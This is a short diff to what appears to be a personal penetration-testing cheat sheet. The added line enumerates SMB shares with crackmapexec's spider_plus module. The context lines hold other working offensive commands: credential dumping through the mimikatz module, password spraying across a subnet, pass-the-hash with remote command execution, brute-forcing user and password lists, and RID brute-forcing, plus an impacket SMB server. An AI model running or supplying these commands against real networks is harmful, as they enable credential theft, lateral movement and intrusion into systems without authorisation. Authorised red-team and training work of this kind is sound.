@@ -5,6 +5,7 @@ impacket-smbserver COMPARTIDA . -smb2support -u USUARIO -p PASSWORD
 # crackmapexec
 crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz
 crackmapexec smb 10.21.16.0/24 -u 'user' -p cul_spray.txt -M enum_avproducts
+crackmapexec smb IP -u USER -p PASS --shares -M spider_plus
 crackmapexec smb ip -u 'user' -H 'hash' -x 'CMD'
 crackmapexec smb ip -u user.txt -p pass.txt --continue-on-success
 crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --rid-brute
